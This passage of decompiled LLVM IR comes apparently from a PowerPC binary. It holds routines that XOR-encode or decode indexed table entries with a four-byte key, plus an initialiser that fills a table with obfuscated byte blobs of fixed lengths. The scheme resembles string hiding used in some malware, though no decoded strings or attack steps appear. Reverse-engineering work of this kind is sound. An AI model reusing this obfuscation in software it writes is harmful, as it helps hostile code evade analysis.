  %v3_10006bb0 = icmp eq i32* %arg2, null
  %v1_10006bb8 = mul i32 %arg1, 8
  store i32 %v1_10006bb8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), i32* %r9.global-to-local, align 4
  br i1 %v3_10006bb0, label %dec_label_pc_10006bd0, label %dec_label_pc_10006bc8

dec_label_pc_10006bc8:                            ; preds = %dec_label_pc_10006bb0
  %v1_10006bc8 = add i32 %v1_10006bb8, add (i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), i32 4)
  %v2_10006bc8 = inttoptr i32 %v1_10006bc8 to i16*
  %v3_10006bc8 = load i16, i16* %v2_10006bc8, align 4
  %v4_10006bc8 = zext i16 %v3_10006bc8 to i32
  store i32 %v4_10006bc8, i32* %arg2, align 4
  %v0_10006bd0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10006bd0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006bd0

dec_label_pc_10006bd0:                            ; preds = %dec_label_pc_10006bb0, %dec_label_pc_10006bc8
  %v1_10006bd0 = phi i32 [ ptrtoint (i32* @global_var_1001b32c.157 to i32), %dec_label_pc_10006bb0 ], [ %v1_10006bd0.pre, %dec_label_pc_10006bc8 ]
  %v0_10006bd0 = phi i32 [ %v1_10006bb8, %dec_label_pc_10006bb0 ], [ %v0_10006bd0.pre, %dec_label_pc_10006bc8 ]
  %v2_10006bd0 = add i32 %v0_10006bd0, %v1_10006bd0
  %v3_10006bd0 = inttoptr i32 %v2_10006bd0 to i32*
  %v4_10006bd0 = load i32, i32* %v3_10006bd0, align 4
  store i32 %v4_10006bd0, i32* %r3.global-to-local, align 4
  ret i32 %v4_10006bd0

; uselistorder directives
  uselistorder i32 %v1_10006bb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006bd0, { 1, 0 }
}

define i32 @function_10006bd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006bd8:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_10006bdc = mul i32 %arg1, 8
  %v2_10006be4 = add i32 %v1_10006bdc, ptrtoint (i32* @global_var_1001b32c.157 to i32)
  %v1_10006bec = add i32 %v1_10006bdc, add (i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), i32 4)
  %v2_10006bec = inttoptr i32 %v1_10006bec to i16*
  %v3_10006bec = load i16, i16* %v2_10006bec, align 4
  %v3_10006bf0 = icmp eq i16 %v3_10006bec, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10006bf0, i1* %cr7_eq.global-to-local, align 1
  %v3_10006bf4 = load i32, i32* @global_var_1001b274.158, align 4
  %v1_10006bf8 = udiv i32 %v3_10006bf4, 16777216
  store i32 %v1_10006bf8, i32* @r5, align 4
  %v1_10006bfc = urem i32 %v3_10006bf4, 256
  store i32 %v1_10006bfc, i32* %r6.global-to-local, align 4
  %v1_10006c00 = call i32 @__asm_rlwinm(i32 %v3_10006bf4, i32 24, i32 24, i32 31)
  %v1_10006c04 = call i32 @__asm_rlwinm(i32 %v3_10006bf4, i32 16, i32 24, i32 31)
  %v0_10006c08 = load i32, i32* @lr, align 4
  %v1_10006c08 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v2_10006c08 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v3_10006c08 = or i1 %v1_10006c08, %v2_10006c08
  call void @__pseudo_cond_branch(i1 %v3_10006c08, i32 %v0_10006c08)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10006c10 = inttoptr i32 %v2_10006be4 to i32*
  br label %dec_label_pc_10006c10

dec_label_pc_10006c10:                            ; preds = %dec_label_pc_10006c10, %dec_label_pc_10006bd8
  %v1_10006c1c = phi i32 [ %v1_10006c50, %dec_label_pc_10006c10 ], [ 0, %dec_label_pc_10006bd8 ]
  %v2_10006c10 = load i32, i32* %v1_10006c10, align 4
  %v2_10006c14 = add i32 %v2_10006c10, %v1_10006c1c
  %v3_10006c14 = inttoptr i32 %v2_10006c14 to i8*
  %v4_10006c14 = load i8, i8* %v3_10006c14, align 1
  %v5_10006c14 = zext i8 %v4_10006c14 to i32
  %v0_10006c18 = load i32, i32* %r6.global-to-local, align 4
  %v2_10006c18 = xor i32 %v0_10006c18, %v5_10006c14
  %v3_10006c1c = trunc i32 %v2_10006c18 to i8
  store i8 %v3_10006c1c, i8* %v3_10006c14, align 1
  %v2_10006c20 = load i32, i32* %v1_10006c10, align 4
  %v0_10006c24 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006c24 = add i32 %v0_10006c24, %v2_10006c20
  %v3_10006c24 = inttoptr i32 %v2_10006c24 to i8*
  %v4_10006c24 = load i8, i8* %v3_10006c24, align 1
  %v5_10006c24 = zext i8 %v4_10006c24 to i32
  %v2_10006c28 = xor i32 %v5_10006c24, %v1_10006c00
  %v3_10006c2c = trunc i32 %v2_10006c28 to i8
  store i8 %v3_10006c2c, i8* %v3_10006c24, align 1
  %v2_10006c30 = load i32, i32* %v1_10006c10, align 4
  %v0_10006c34 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006c34 = add i32 %v0_10006c34, %v2_10006c30
  %v3_10006c34 = inttoptr i32 %v2_10006c34 to i8*
  %v4_10006c34 = load i8, i8* %v3_10006c34, align 1
  %v5_10006c34 = zext i8 %v4_10006c34 to i32
  %v2_10006c38 = xor i32 %v5_10006c34, %v1_10006c04
  %v3_10006c3c = trunc i32 %v2_10006c38 to i8
  store i8 %v3_10006c3c, i8* %v3_10006c34, align 1
  %v2_10006c40 = load i32, i32* %v1_10006c10, align 4
  %v0_10006c44 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006c44 = add i32 %v0_10006c44, %v2_10006c40
  %v3_10006c44 = inttoptr i32 %v2_10006c44 to i8*
  %v4_10006c44 = load i8, i8* %v3_10006c44, align 1
  %v5_10006c44 = zext i8 %v4_10006c44 to i32
  %v0_10006c48 = load i32, i32* @r5, align 4
  %v2_10006c48 = xor i32 %v0_10006c48, %v5_10006c44
  %v3_10006c4c = trunc i32 %v2_10006c48 to i8
  store i8 %v3_10006c4c, i8* %v3_10006c44, align 1
  %v0_10006c50 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006c50 = add i32 %v0_10006c50, 1
  store i32 %v1_10006c50, i32* %r10.global-to-local, align 4
  %v3_10006c54 = load i16, i16* %v2_10006bec, align 4
  %v4_10006c54 = zext i16 %v3_10006c54 to i32
  %v2_10006c58 = icmp slt i32 %v4_10006c54, %v1_10006c50
  %v3_10006c58 = icmp sgt i32 %v4_10006c54, %v1_10006c50
  %v4_10006c58 = icmp eq i32 %v4_10006c54, %v1_10006c50
  store i1 %v2_10006c58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10006c58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006c58, label %dec_label_pc_10006c10, label %dec_label_pc_10006c60

dec_label_pc_10006c60:                            ; preds = %dec_label_pc_10006c10
  ret i32 %v2_10006be4

; uselistorder directives
  uselistorder i32 %v4_10006c54, { 2, 1, 0 }
  uselistorder i32 %v1_10006c50, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_10006bf4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006bdc, { 1, 0 }
}

define i32 @function_10006c64(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006c64:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_10006c68 = mul i32 %arg1, 8
  %v2_10006c70 = add i32 %v1_10006c68, ptrtoint (i32* @global_var_1001b32c.157 to i32)
  %v1_10006c78 = add i32 %v1_10006c68, add (i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), i32 4)
  %v2_10006c78 = inttoptr i32 %v1_10006c78 to i16*
  %v3_10006c78 = load i16, i16* %v2_10006c78, align 4
  %v3_10006c7c = icmp eq i16 %v3_10006c78, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10006c7c, i1* %cr7_eq.global-to-local, align 1
  %v3_10006c80 = load i32, i32* @global_var_1001b274.158, align 4
  %v1_10006c84 = udiv i32 %v3_10006c80, 16777216
  store i32 %v1_10006c84, i32* @r5, align 4
  %v1_10006c88 = urem i32 %v3_10006c80, 256
  store i32 %v1_10006c88, i32* %r6.global-to-local, align 4
  %v1_10006c8c = call i32 @__asm_rlwinm(i32 %v3_10006c80, i32 24, i32 24, i32 31)
  %v1_10006c90 = call i32 @__asm_rlwinm(i32 %v3_10006c80, i32 16, i32 24, i32 31)
  %v0_10006c94 = load i32, i32* @lr, align 4
  %v1_10006c94 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v2_10006c94 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v3_10006c94 = or i1 %v1_10006c94, %v2_10006c94
  call void @__pseudo_cond_branch(i1 %v3_10006c94, i32 %v0_10006c94)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10006c9c = inttoptr i32 %v2_10006c70 to i32*
  br label %dec_label_pc_10006c9c

dec_label_pc_10006c9c:                            ; preds = %dec_label_pc_10006c9c, %dec_label_pc_10006c64
  %v1_10006ca8 = phi i32 [ %v1_10006cdc, %dec_label_pc_10006c9c ], [ 0, %dec_label_pc_10006c64 ]
  %v2_10006c9c = load i32, i32* %v1_10006c9c, align 4
  %v2_10006ca0 = add i32 %v2_10006c9c, %v1_10006ca8
  %v3_10006ca0 = inttoptr i32 %v2_10006ca0 to i8*
  %v4_10006ca0 = load i8, i8* %v3_10006ca0, align 1
  %v5_10006ca0 = zext i8 %v4_10006ca0 to i32
  %v0_10006ca4 = load i32, i32* %r6.global-to-local, align 4
  %v2_10006ca4 = xor i32 %v0_10006ca4, %v5_10006ca0
  %v3_10006ca8 = trunc i32 %v2_10006ca4 to i8
  store i8 %v3_10006ca8, i8* %v3_10006ca0, align 1
  %v2_10006cac = load i32, i32* %v1_10006c9c, align 4
  %v0_10006cb0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006cb0 = add i32 %v0_10006cb0, %v2_10006cac
  %v3_10006cb0 = inttoptr i32 %v2_10006cb0 to i8*
  %v4_10006cb0 = load i8, i8* %v3_10006cb0, align 1
  %v5_10006cb0 = zext i8 %v4_10006cb0 to i32
  %v2_10006cb4 = xor i32 %v5_10006cb0, %v1_10006c8c
  %v3_10006cb8 = trunc i32 %v2_10006cb4 to i8
  store i8 %v3_10006cb8, i8* %v3_10006cb0, align 1
  %v2_10006cbc = load i32, i32* %v1_10006c9c, align 4
  %v0_10006cc0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006cc0 = add i32 %v0_10006cc0, %v2_10006cbc
  %v3_10006cc0 = inttoptr i32 %v2_10006cc0 to i8*
  %v4_10006cc0 = load i8, i8* %v3_10006cc0, align 1
  %v5_10006cc0 = zext i8 %v4_10006cc0 to i32
  %v2_10006cc4 = xor i32 %v5_10006cc0, %v1_10006c90
  %v3_10006cc8 = trunc i32 %v2_10006cc4 to i8
  store i8 %v3_10006cc8, i8* %v3_10006cc0, align 1
  %v2_10006ccc = load i32, i32* %v1_10006c9c, align 4
  %v0_10006cd0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006cd0 = add i32 %v0_10006cd0, %v2_10006ccc
  %v3_10006cd0 = inttoptr i32 %v2_10006cd0 to i8*
  %v4_10006cd0 = load i8, i8* %v3_10006cd0, align 1
  %v5_10006cd0 = zext i8 %v4_10006cd0 to i32
  %v0_10006cd4 = load i32, i32* @r5, align 4
  %v2_10006cd4 = xor i32 %v0_10006cd4, %v5_10006cd0
  %v3_10006cd8 = trunc i32 %v2_10006cd4 to i8
  store i8 %v3_10006cd8, i8* %v3_10006cd0, align 1
  %v0_10006cdc = load i32, i32* %r10.global-to-local, align 4
  %v1_10006cdc = add i32 %v0_10006cdc, 1
  store i32 %v1_10006cdc, i32* %r10.global-to-local, align 4
  %v3_10006ce0 = load i16, i16* %v2_10006c78, align 4
  %v4_10006ce0 = zext i16 %v3_10006ce0 to i32
  %v2_10006ce4 = icmp slt i32 %v4_10006ce0, %v1_10006cdc
  %v3_10006ce4 = icmp sgt i32 %v4_10006ce0, %v1_10006cdc
  %v4_10006ce4 = icmp eq i32 %v4_10006ce0, %v1_10006cdc
  store i1 %v2_10006ce4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10006ce4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006ce4, label %dec_label_pc_10006c9c, label %dec_label_pc_10006cec

dec_label_pc_10006cec:                            ; preds = %dec_label_pc_10006c9c
  ret i32 %v2_10006c70

; uselistorder directives
  uselistorder i32 %v4_10006ce0, { 2, 1, 0 }
  uselistorder i32 %v1_10006cdc, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_10006c80, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006c68, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), i32 4), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001b32c.157 to i32), { 1, 3, 0, 2, 4 }
}

define i32 @function_10006cf0() local_unnamed_addr {
dec_label_pc_10006cf0:
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  store i32 15, i32* @r3, align 4
  %v0_10006cfc = load i32, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1000a8b0.159 to i32), i32* @r28, align 4
  store i32 19, i32* %r21.global-to-local, align 4
  store i32 16, i32* %r22.global-to-local, align 4
  store i32 11, i32* %r23.global-to-local, align 4
  store i32 9, i32* %r24.global-to-local, align 4
  store i32 15, i32* %r25.global-to-local, align 4
  store i32 2, i32* %r26.global-to-local, align 4
  store i32 268463432, i32* @lr, align 4
  %v0_10006d44 = call i32 @function_10008d68()
  %v0_10006d4c = load i32, i32* @r28, align 4
  store i32 %v0_10006d44, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d60.160 to i32), i32* @lr, align 4
  %v3_10006d5c = call i32 @function_10007560(i32 %v0_10006d4c, i32 15, i32 15)
  store i32 2, i32* @r3, align 4
  %v0_10006d64 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10006d64, i32* @global_var_1001b344.161, align 4
  %v0_10006d68 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006d68 = trunc i32 %v0_10006d68 to i16
  store i16 %v1_10006d68, i16* bitcast (i32* @global_var_1001b348.162 to i16*), align 4
  store i32 268463472, i32* @lr, align 4
  %v0_10006d6c = call i32 @function_10008d68()
  store i32 %v0_10006d6c, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d84.164 to i32), i32* @lr, align 4
  %v4_10006d80 = call i32 @function_10007560(i32 ptrtoint ([3 x i8]* @global_var_1000a8c0.163 to i32), i32 2, i32 2)
  store i32 15, i32* @r3, align 4
  %v0_10006d88 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10006d88, i32* @global_var_1001b34c.165, align 4
  %v0_10006d8c = load i32, i32* %r26.global-to-local, align 4
  %v1_10006d8c = trunc i32 %v0_10006d8c to i16
  store i16 %v1_10006d8c, i16* bitcast (i32* @global_var_1001b350.166 to i16*), align 4
  store i32 268463508, i32* @lr, align 4
  %v0_10006d90 = call i32 @function_10008d68()
  %v0_10006d94 = load i32, i32* @r28, align 4
  store i32 %v0_10006d90, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006da4.167 to i32), i32* @lr, align 4
  %v3_10006da0 = call i32 @function_10007560(i32 %v0_10006d94, i32 15, i32 15)
  store i32 2, i32* @r3, align 4
  %v0_10006da8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10006da8, i32* @global_var_1001b3bc.168, align 4
  %v0_10006dac = load i32, i32* %r25.global-to-local, align 4
  %v1_10006dac = trunc i32 %v0_10006dac to i16
  store i16 %v1_10006dac, i16* bitcast (i32* @global_var_1001b3c0.169 to i16*), align 4
  store i32 268463540, i32* @lr, align 4
  %v0_10006db0 = call i32 @function_10008d68()
  store i32 %v0_10006db0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006dc8.171 to i32), i32* @lr, align 4
  %v3_10006dc4 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8c4.170 to i32), i32 2, i32 2)
  store i32 10, i32* @r3, align 4
  %v0_10006dcc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006dcc, i32* @global_var_1001b3c4.172, align 4
  store i32 7, i32* %r27.global-to-local, align 4
  %v0_10006dd4 = load i32, i32* %r26.global-to-local, align 4
  %v1_10006dd4 = trunc i32 %v0_10006dd4 to i16
  store i16 %v1_10006dd4, i16* bitcast (i32* @global_var_1001b3c8.173 to i16*), align 4
  store i32 268463580, i32* @lr, align 4
  %v0_10006dd8 = call i32 @function_10008d68()
  store i32 10, i32* %r26.global-to-local, align 4
  store i32 %v0_10006dd8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006df4.175 to i32), i32* @lr, align 4
  %v3_10006df0 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8c8.174 to i32), i32 10, i32 10)
  store i32 29, i32* @r3, align 4
  %v0_10006df8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006df8, i32* @global_var_1001b33c.176, align 4
  %v0_10006dfc = load i32, i32* %r26.global-to-local, align 4
  %v1_10006dfc = trunc i32 %v0_10006dfc to i16
  store i16 %v1_10006dfc, i16* bitcast (i32* @global_var_1001b340.177 to i16*), align 4
  store i32 268463620, i32* @lr, align 4
  %v0_10006e00 = call i32 @function_10008d68()
  store i32 %v0_10006e00, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006e18.179 to i32), i32* @lr, align 4
  %v3_10006e14 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab04.178 to i32), i32 29, i32 29)
  store i32 7, i32* @r3, align 4
  store i16 29, i16* bitcast (i32* @global_var_1001b358.180 to i16*), align 4
  %v0_10006e24 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006e24, i32* @global_var_1001b354.181, align 4
  store i32 268463660, i32* @lr, align 4
  %v0_10006e28 = call i32 @function_10008d68()
  store i32 %v0_10006e28, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006e40.183 to i32), i32* @lr, align 4
  %v3_10006e3c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8d4.182 to i32), i32 7, i32 7)
  store i32 5, i32* @r3, align 4
  %v0_10006e44 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006e44, i32* @global_var_1001b35c.184, align 4
  store i32 8, i32* %r25.global-to-local, align 4
  %v0_10006e4c = load i32, i32* %r27.global-to-local, align 4
  %v1_10006e4c = trunc i32 %v0_10006e4c to i16
  store i16 %v1_10006e4c, i16* bitcast (i32* @global_var_1001b360.185 to i16*), align 4
  store i32 268463700, i32* @lr, align 4
  %v0_10006e50 = call i32 @function_10008d68()
  store i32 %v0_10006e50, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006e68.187 to i32), i32* @lr, align 4
  %v3_10006e64 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8dc.186 to i32), i32 5, i32 5)
  store i32 11, i32* @r3, align 4
  store i16 5, i16* bitcast (i32* @global_var_1001b368.188 to i16*), align 4
  %v0_10006e74 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006e74, i32* @global_var_1001b364.189, align 4
  store i32 268463740, i32* @lr, align 4
  %v0_10006e78 = call i32 @function_10008d68()
  store i32 %v0_10006e78, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006e90.191 to i32), i32* @lr, align 4
  %v3_10006e8c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8e4.190 to i32), i32 11, i32 11)
  store i32 4, i32* @r3, align 4
  %v0_10006e94 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006e94, i32* @global_var_1001b36c.192, align 4
  %v0_10006e98 = load i32, i32* %r23.global-to-local, align 4
  %v1_10006e98 = trunc i32 %v0_10006e98 to i16
  store i16 %v1_10006e98, i16* bitcast (i32* @global_var_1001b370.193 to i16*), align 4
  store i32 268463776, i32* @lr, align 4
  %v0_10006e9c = call i32 @function_10008d68()
  store i32 %v0_10006e9c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006eb4.195 to i32), i32* @lr, align 4
  %v3_10006eb0 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8f0.194 to i32), i32 4, i32 4)
  store i32 7, i32* @r3, align 4
  store i16 4, i16* bitcast (i32* @global_var_1001b378.196 to i16*), align 4
  %v0_10006ec0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006ec0, i32* @global_var_1001b374.197, align 4
  store i32 268463816, i32* @lr, align 4
  %v0_10006ec4 = call i32 @function_10008d68()
  store i32 %v0_10006ec4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006edc.199 to i32), i32* @lr, align 4
  %v3_10006ed8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a8f8.198 to i32), i32 7, i32 7)
  store i32 8, i32* @r3, align 4
  %v0_10006ee0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006ee0, i32* @global_var_1001b37c.200, align 4
  %v0_10006ee4 = load i32, i32* %r27.global-to-local, align 4
  %v1_10006ee4 = trunc i32 %v0_10006ee4 to i16
  store i16 %v1_10006ee4, i16* bitcast (i32* @global_var_1001b380.201 to i16*), align 4
  store i32 268463852, i32* @lr, align 4
  %v0_10006ee8 = call i32 @function_10008d68()
  store i32 %v0_10006ee8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f00.203 to i32), i32* @lr, align 4
  %v3_10006efc = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a900.202 to i32), i32 8, i32 8)
  store i32 13, i32* @r3, align 4
  %v0_10006f04 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006f04, i32* @global_var_1001b384.204, align 4
  %v0_10006f08 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006f08 = trunc i32 %v0_10006f08 to i16
  store i16 %v1_10006f08, i16* bitcast (i32* @global_var_1001b388.205 to i16*), align 4
  store i32 268463888, i32* @lr, align 4
  %v0_10006f0c = call i32 @function_10008d68()
  store i32 %v0_10006f0c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006f24.207 to i32), i32* @lr, align 4
  %v3_10006f20 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a90c.206 to i32), i32 13, i32 13)
  store i32 10, i32* @r3, align 4
  store i16 13, i16* bitcast (i32* @global_var_1001b390.208 to i16*), align 4
  %v0_10006f30 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006f30, i32* @global_var_1001b38c.209, align 4
  store i32 268463928, i32* @lr, align 4
  %v0_10006f34 = call i32 @function_10008d68()
  store i32 %v0_10006f34, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f4c.211 to i32), i32* @lr, align 4
  %v4_10006f48 = call i32 @function_10007560(i32 ptrtoint ([11 x i8]* @global_var_1000a91c.210 to i32), i32 10, i32 10)
  store i32 10, i32* @r3, align 4
  %v0_10006f50 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006f50, i32* @global_var_1001b394.212, align 4
  %v0_10006f54 = load i32, i32* %r26.global-to-local, align 4
  %v1_10006f54 = trunc i32 %v0_10006f54 to i16
  store i16 %v1_10006f54, i16* bitcast (i32* @global_var_1001b398.213 to i16*), align 4
  store i32 268463964, i32* @lr, align 4
  %v0_10006f58 = call i32 @function_10008d68()
  store i32 %v0_10006f58, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f70.215 to i32), i32* @lr, align 4
  %v4_10006f6c = call i32 @function_10007560(i32 ptrtoint ([11 x i8]* @global_var_1000a928.214 to i32), i32 10, i32 10)
  store i32 33, i32* @r3, align 4
  %v0_10006f74 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006f74, i32* @global_var_1001b39c.216, align 4
  %v0_10006f78 = load i32, i32* %r26.global-to-local, align 4
  %v1_10006f78 = trunc i32 %v0_10006f78 to i16
  store i16 %v1_10006f78, i16* bitcast (i32* @global_var_1001b3a0.217 to i16*), align 4
  store i32 268464000, i32* @lr, align 4
  %v0_10006f7c = call i32 @function_10008d68()
  store i32 %v0_10006f7c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006f94.219 to i32), i32* @lr, align 4
  %v3_10006f90 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a934.218 to i32), i32 33, i32 33)
  store i32 8, i32* @r3, align 4
  store i16 33, i16* bitcast (i32* @global_var_1001b3a8.220 to i16*), align 4
  %v0_10006fa0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006fa0, i32* @global_var_1001b3a4.221, align 4
  store i32 268464040, i32* @lr, align 4
  %v0_10006fa4 = call i32 @function_10008d68()
  store i32 %v0_10006fa4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006fbc.223 to i32), i32* @lr, align 4
  %v3_10006fb8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a958.222 to i32), i32 8, i32 8)
  store i32 11, i32* @r3, align 4
  %v0_10006fc0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006fc0, i32* @global_var_1001b3ac.224, align 4
  %v0_10006fc4 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006fc4 = trunc i32 %v0_10006fc4 to i16
  store i16 %v1_10006fc4, i16* bitcast (i32* @global_var_1001b3b0.225 to i16*), align 4
  store i32 268464076, i32* @lr, align 4
  %v0_10006fc8 = call i32 @function_10008d68()
  store i32 %v0_10006fc8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006fe0.227 to i32), i32* @lr, align 4
  %v4_10006fdc = call i32 @function_10007560(i32 ptrtoint ([12 x i8]* @global_var_1000a964.226 to i32), i32 11, i32 11)
  store i32 6, i32* @r3, align 4
  %v0_10006fe4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006fe4, i32* @global_var_1001b3b4.228, align 4
  %v0_10006fe8 = load i32, i32* %r23.global-to-local, align 4
  %v1_10006fe8 = trunc i32 %v0_10006fe8 to i16
  store i16 %v1_10006fe8, i16* bitcast (i32* @global_var_1001b3b8.229 to i16*), align 4
  store i32 268464112, i32* @lr, align 4
  %v0_10006fec = call i32 @function_10008d68()
  store i32 %v0_10006fec, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007004.231 to i32), i32* @lr, align 4
  %v3_10007000 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a970.230 to i32), i32 6, i32 6)
  store i32 7, i32* @r3, align 4
  store i16 6, i16* bitcast (i32* @global_var_1001b3d0.232 to i16*), align 4
  %v0_10007010 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007010, i32* @global_var_1001b3cc.233, align 4
  store i32 268464152, i32* @lr, align 4
  %v0_10007014 = call i32 @function_10008d68()
  store i32 %v0_10007014, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000702c.235 to i32), i32* @lr, align 4
  %v3_10007028 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab24.234 to i32), i32 7, i32 7)
  store i32 7, i32* @r3, align 4
  %v0_10007030 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007030, i32* @global_var_1001b3d4.236, align 4
  %v0_10007034 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007034 = trunc i32 %v0_10007034 to i16
  store i16 %v1_10007034, i16* bitcast (i32* @global_var_1001b3d8.237 to i16*), align 4
  store i32 268464188, i32* @lr, align 4
  %v0_10007038 = call i32 @function_10008d68()
  store i32 %v0_10007038, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007050.239 to i32), i32* @lr, align 4
  %v3_1000704c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a978.238 to i32), i32 7, i32 7)
  store i32 3, i32* @r3, align 4
  %v0_10007054 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007054, i32* @global_var_1001b3dc.240, align 4
  %v0_10007058 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007058 = trunc i32 %v0_10007058 to i16
  store i16 %v1_10007058, i16* bitcast (i32* @global_var_1001b3e0.241 to i16*), align 4
  store i32 268464224, i32* @lr, align 4
  %v0_1000705c = call i32 @function_10008d68()
  store i32 %v0_1000705c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007074.243 to i32), i32* @lr, align 4
  %v3_10007070 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a980.242 to i32), i32 3, i32 3)
  store i32 19, i32* @r3, align 4
